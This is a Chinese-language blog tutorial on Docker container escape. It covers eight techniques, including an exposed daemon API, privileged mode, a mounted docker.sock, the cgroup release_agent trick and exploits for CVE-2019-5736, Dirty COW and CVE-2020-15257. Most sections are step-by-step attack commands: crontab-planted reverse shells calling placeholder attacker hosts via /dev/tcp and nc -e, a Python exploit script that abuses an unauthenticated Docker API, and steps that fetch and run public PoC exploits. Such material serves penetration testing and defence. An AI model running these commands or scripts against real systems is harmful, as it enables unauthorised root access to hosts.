---
title: "一文讲清Docker逃逸"
date: 2024-08-07
description: "docker是一个用Go语言实现的开源项目，可以方便地创建和使用容器，docker将程序以及程序所有的依赖都打包到docker container，这样程序可以在任何环境都会有一致的表现，这里程序运行的依赖也就是容器就好比集装箱，容器所处的操作系统环境就好比货船或港口，程序的表现只和集装箱有关系(容器)，和集装箱..."
tags: ["docker"]
categories: ["${folder}"]
---

**Docker**

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/001-0.webp)

docker是一个用Go语言实现的开源项目，可以方便地创建和使用容器，docker将程序以及程序所有的依赖都打包到docker container，这样程序可以在任何环境都会有一致的表现，这里程序运行的依赖也就是容器就好比集装箱，容器所处的操作系统环境就好比货船或港口，程序的表现只和集装箱有关系(容器)，和集装箱放在哪个货船或者哪个港口(操作系统)没有关系。不会再有“在我的环境上可以运行”，真正实现“build once, run everywhere”。

**Docker的安全性**

讨论Docker的安全性主要在以下几个方面进行讨论：

*   Docker容器是否会危害到宿主机或其他容器；
    
*   镜像的安全性用户如何确保下载下来的镜像是可信的、未被篡改过的；
    
*   Docker daemon的安全性如何确保发送给daemon的命令是由可信用户发起的。
    

Docker之所以会出现安全性问题，根源在于**容器和宿主机共用内核**，因此受攻击面特别大；另外，如果容器里的应用导致Linux内核崩溃，整个系统也会随之崩溃。这一点与虚拟机是不同的，虚拟机与宿主机的接口非常有限，而且虚拟机崩溃一般不会导致宿主机崩溃。在共用内核的前提下，容器主要通过内核的Cgroup和Namespace这两大特性来达到容器隔离和资源限制的目的。目前Cgroup对系统资源的限制比较完善，但Namespace的隔离还是不够完善，只有PID、mount、network、UTS、IPC和user这几种手段。而对于未隔离的内核资源，容器访问时也会存在影响到宿主机及其他容器的风险。比如，procfs里的很多接口都未隔离，通过procfs可以查询到整个系统的信息，包括系统的CPU、内存等资源信息，所以Docker容器的procfs是以只读方式挂载的，否则修改procfs里的内核参数将会影响甚至破坏宿主机。内核syslog也是没有被隔离的，因此在容器内可以看到容器外其他进程产生的内核syslog。因此，Namespace的隔离非但是不完善的，甚至是不可能完善的。这是共用内核导致的固有缺陷，并且未来Linux内核社区也不会对此做太多的改进。在众多风险中，如果从虚拟机容器权限中逃逸出来，获取了宿主机权限，则为“虚拟机逃逸”，今天在这里做详细介绍。轻功护身，随意逃逸~

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/002-0.webp)

  
 

# 如何确认是在docker容器中？

**方法一：检查根目录下是否存在.dockerenv文件**

如果根目录下存在.dockerenv文件，说明是在docker容器中。

```text-plain
ls -al /
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/003-0.png)

**方法二：检查 /proc/1/cgroup 是否存在含有docker字符串**

查询系统进程的cgroup信息，存在docker字段则是在docker容器中。

```text-plain
cat /proc/1/cgroup
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/004-0.webp)  
 

  
 

# Docker逃逸

## 1、docker daemon api未授权访问

**漏洞原理**  
 

在使用docker集群管理工具的时候，节点上会开放一个TCP端口2375，绑定在0.0.0.0上，如果我们使用HTTP的方式访问会返回404

**利用思路**

通过挂载宿主机的目录，写定时任务获取shell，从而逃逸。

**影响版本**

Docker <= 18.09.9

**关键步骤**

1、环境模拟：创建容器，进入容器

```text-plain
docker -H xx.xx.xx.xx:2375 run -it --privileged alpine /bin/sh
```

2、查看本地磁盘

```text-plain
fdisk -l
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/005-0.webp)

3、创建测试目录，并将本地磁盘挂载在test目录下

```text-plain
mkdir test
```

```text-plain
mount /dev/vda1 /test
```

4、创建计划任务：

编辑 /var/spool/cron/crontabs/root  
添加计划任务

```text-plain
 * * * * bash -i >& /dev/tcp/【攻击机器ip】/6666 0>&1
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/006-0.webp)

反弹shell成功：

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/007-0.webp)

Exp 脚本:

```text-plain
import docker  
```

```text-plain
client = docker.DockerClient(base_url='http://xx.xx.xx.xx:2375')
```

```text-plain
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc 目标ip 1234 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
```

```text-plain
print(data)
```

## 2、privileged 特权模式启动容器

**特权模式与非特权模式的区别**

**区别一：Linux Capabilities**

*   普通模式下容器内进程只可以使用有限的一些 Linux Capabilities
    
*   特权模式下的容器内进程可以使用所有的 linux capabilities
    

**区别二：Linux敏感目录**  
 

普通模式下，部分内核模块路径比如 /proc 下的一些目录需要阻止写入、有些又需要允许读写， 这些文件目录将会以 tmpfs 文件系统的方式挂载到容器中，以实现目录 mask 的需求

特权模式下，这些目录将不再以 tmpfs 文件系统的方式挂载

Tmpfs说明:https://blog.51cto.com/u\_11495268/2424414

**区别三：内核文件的可读写性**

普通模式下，部分内核文件系统(sysfs、procfs)会被以只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核

特权模式下，内核文件系统将不再以只读的方式被挂载

**区别四：AppArmor与Seccomp**

AppArmor：https://www.cnblogs.com/zlhff/p/5464862.htmlSeccomp：https://en.wikipedia.org/wiki/Seccomp

普通模式下，可以通过配置 AppArmor 或 Seccomp 相关安全选项 （如果未配置的话，容器引擎默认也会启用一些对应的默认配置） 对容器进行加固

特权模式下，这些 AppArmor 或 Seccomp 相关配置将不再生效

**区别五：cgroup读写**

默认模式下，只能以只读模式操作 cgroup

特权模式下，将可以对 cgroup 进行读写操作

**区别六：/dev**

普通模式下，容器内 /dev 目录下看不到节点 /dev 目录下特有的 devices

特权模式下，容器内的 /dev 目录会包含这些来自节点 /dev 目录下的那些内容

**区别七：SELinux**

特权模式下，SELinux 相关的安全加固配置将被禁用。

普通模式下也可以通过对应的安全选项来禁用 SELinux 特性

**漏洞原理**

特权模式逃逸是一种最简单有效的逃逸方法，使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，可直接通过chroot切换根目录、写ssh公钥和crontab计划任何等逃逸到宿主机。

**关键步骤**

1、环境搭建：

拉取一个镜像，在启用时使用--privileged。

```text-plain
docker pull ubuntu:16.04
```

```text-plain
docker run -itd --privileged ubuntu:16.04 /bin/bash
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/008-0.webp)

2、漏洞验证

判断是否是特权模式启动，如果是以特权模式启动的话，CapEff对应的掩码值应该为0000003fffffffff。

```text-plain
cat /proc/self/status |grep Cap
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/009-0.png)

3、漏洞利用

在docker容器中查看系统磁盘分区情况，在新建一个目录，将宿主机所在磁盘挂载到新建的目录中。

```text-plain
Plain Text
```

```text-plain
fdisk -l
```

```text-plain
mkdir /hacker
```

```text-plain
mount /dev/sda5 /hacker
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/010-0.webp)

进入到hacker目录,通过touch创建一个sh文件，再将bash反弹命令写入到创建的sh文件里面，在编写计划任务到/hacker/etc/crontab文件中。

```text-plain
touch /hacker/hacker.sh
```

```text-plain
echo "bash -i >& /dev/tcp/xx.xx.xx.xx/6666 0>&1" >/hacker/hacker.sh
```

```text-plain
echo "* * * * * root bash /hacker.sh" >> /hacker/etc/crontab
```

返回到kali中进行查看，已成功接收到shell。

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/011-0.webp)

## 3、挂载docker.sock

**什么是docker.sock**

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/012-0.webp)

docker.sock 是docker client 和docker daemon 在localhost进行通信的socket文件

Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd。默认情况下，在 /var/run/docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）

**环境搭建**

**创建docker**

```text-plain
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/013-0.webp)

随后在docker容器中安装docker：

```text-plain
# ubuntu 18.04安装docker
```

```text-plain
apt-get update
```

```text-plain
# 安装依赖包
```

```text-plain
apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common
```

```text-plain
# 添加 Docker 的官方 GPG 密钥
```

```text-plain
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
```

```text-plain
# 验证您现在是否拥有带有指纹的密钥
```

```text-plain
apt-key fingerprint 0EBFCD88
```

```text-plain
# 设置稳定版仓库
```

```text-plain
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
```

```text-plain
# 更新
```

```text-plain
apt-get update
```

```text-plain
# 安装最新的Docker-ce  
```

```text-plain
apt-get install docker-ce
```

```text-plain
# 启动
```

```text-plain
systemctl enable docker
```

```text-plain
systemctl start docker
```

用docker ps就可以看到宿主机上的容器

**关键步骤**

将宿主机的根目录挂载到容器

```text-plain
docker run -it -v /:/uzju ubuntu:18.04 /bin/bash  
```

```text-plain
chroot uzju
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/014-0.webp)

docker容器反弹shell通过修改crontab即可实现：

```text-plain
crontab -e  
```

```text-plain
* * * * * /bin/bash -i >& /dev/tcp/xx.xx.xx.xx/port号 >&
```

 

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/015-0.webp)

## 4、挂载宿主机根目录

如果在docker启动的时候挂载了宿主机的根目录，就可以通过chroot获取宿主机的权限

```text-plain
docker run -it -v /:/uzju/ ubuntu:18.04 chroot /uzju/
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/016-0.webp)

**反弹shell**可以通过crontab反弹shell

```text-plain
* * * * * /bin/bash -i >& /dev/tcp/xx.xx.xx.xx/port号 >&
```

## 5、Cgroup执行宿主机系统命令

通过notify\_on\_release实现容器逃逸 **条件**

以root用户身份在容器内运行

使用SYS\_ADMINLinux功能运行

缺少AppArmor配置文件，否则将允许mountsyscall

cgroup v1虚拟文件系统必须以读写方式安装在容器内

```text-plain
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04
```

挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x

```text-plain
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

设置/tmp/cgrp/x的cgroup的notify\_no\_release和release\_agent  
设置/tmp/cgrp/x的notify\_no\_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release\_agent

```text-plain
echo 1 > /tmp/cgrp/x/notify_on_release
```

```text-plain
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

```text-plain
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

写入自定义命令

```text-plain
echo '#!/bin/sh' > /cmd
```

结果在当前目录的output文件中

```text-plain
echo "ps aux > $host_path/output" >> /cmd
```

```text-plain
chmod a+x /cmd
```

执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release\_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果

```text-plain
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## 6、(CVE-2019-5736)docker runc容器逃逸漏洞

docker runc容器逃逸漏洞（CVE-2019-5736）发生在runc模块（也叫容器运行时）。

Docker、containerd或者其他**基于runc的容器**运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作，来获取到宿主机的runc执行时的文件句柄，并修改掉runc的二进制文件，从而可以在宿主机上以root身份执行命令

**影响版本**

docker version <=18.09.2 RunC version <=1.0-rc6

下载环境：

```text-plain
curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh
```

**漏洞利用**

下载CVE-2019-5736编译go脚本生成攻击payload：

https://github.com/Frichetten/CVE-2019-5736-PoC

将go脚本中的命令修改为反弹shell（附件）

将此内容进行更改，设置nc监听地址。修改payload内容：

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/017-0.webp)

此时编译payload需要go环境，直接安装即可，生成可执行脚本main

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/018-0.webp)

编译完成后，我们运行一个漏洞环境(以CVE-2020-1957漏洞为例)

这里需要注意一下，安装完docker-ce之后，docker-compose是默认没有的，直接使用apt-get install docker-compose 或 pip install docker-compose命令可能会出现错误(尝试安装)，解决方法就是下载一个docker-compose来进行安装，使用root权限执行如下命令：

```text-plain
curl -L https://get.daocloud.io/docker/compose/releases/download/v2.6.1/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose //下载docker-compose 版本为2.6.1 并添加到 /usr/local/bin目录下
```

```text-plain
sudo chmod +x /usr/local/bin/docker-compose //赋予docker-compose执行权限
```

```text-plain
docker-compose -v //查看版本
```

执行以下命令将生成的main脚本cp到docker容器中(这就是模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸)

```text-plain
docker cp /home/szg/CVE-2019-5736-PoC/main 3d5341ae0bf5:/home
```

执行如下命令，进入容器，查看脚本是否拷进容器并启动main脚本

```text-plain
docker exec -it 3d5341ae0bf5 /bin/sh (第一次需使用/bin/sh启动)
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/019-0.webp)

ubuntu启动一个新终端，执行如下命令再次进入容器，触发payload，成功反弹shell，此时权限为服务器权限，docker逃逸成功

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/020-0.webp)

## 7、(CVE-2016-5195)脏牛漏洞实现Docker逃逸

当宿主机存在Dirty Cow(CVE-2016-5195)漏洞时，利用该漏洞，可实现Docker容器逃逸，获得root权限的shell。

**环境搭建**

使用Ubuntu的14.04.5版本进行复现，该版本是存在脏牛漏洞的，执行下面命令之前需要安装好docker和docker-compose。

```text-plain
git clone https://github.com/gebl/dirtycow-docker-vdso.git
```

```text-plain
cd dirtycow-docker-vdso/
```

```text-plain
sudo docker-compose run dirtycow /bin/bash
```

**漏洞利用**

在kali中开启监听后。

在docker镜像中进入到dirtycow-vdso目录，编译之后，并执行。

```text-plain
cd /dirtycow-vdso
```

```text-plain
make
```

```text-plain
./0xdeadbeef 192.168.59.145:6666
```

此时成功docker逃逸

## 8、CVE-2020-15257逃逸

由于在host模式下，容器与host共享一套Network namespaces，此时containerd-shim API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器root权限，且容器的网络模式为--net=host的时候，通过ontainerd-shim API可以达成容器逃逸的目的。

**影响版本**

containerd < 1.4.3  
containerd < 1.3.9

**环境搭建**

使用Ubuntu的16.04.7版本进行复现，通过下面命令安装指定版本docker。

```text-plain
apt-get update
```

```text-plain
apt-get install ca-certificates curl software-properties-common
```

```text-plain
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
```

```text-plain
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu xenial stable"
```

```text-plain
apt-get update
```

```text-plain
apt-cache madison docker-ce
```

```text-plain
apt-get install docker-ce=5:19.03.6~3-0~ubuntu-xenial docker-ce-cli=5:19.03.6~3-0~ubuntu-xenial containerd.io=1.2.4-1
```

![](/images/posts/%E4%B8%80%E6%96%87%E8%AE%B2%E6%B8%85Docker%E9%80%83%E9%80%B8/021-0.webp)

拉取ubuntu:18.04镜像，使用--net=host启动，并进入到该容器内部。  
 

```text-plain
docker pull ubuntu:18.04
```

```text-plain
docker run -itd --net=host ubuntu:18.04 /bin/bash
```

```text-plain
docker exec -it 5be3ed60f152 /bin/bash
```

**漏洞利用**

进入到tmp目录，使用wget下载exp。

```text-plain
cd /tmp
```

```text-plain
wget https://github.com/Xyntax/CDK/releases/download/0.1.6/cdk_v0.1.6_release.tar.gz
```

下载完成之后进行解压。

```text-plain
tar -zxvf cdk_v0.1.6_release.tar.gz
```

在kali中使用nc进行监听，并执行exp。

```text-plain
./cdk_linux_amd64 run shim-pwn xx.xx.xx.xx 6666
```

回到kali中进行查看，已成功接收到shell。
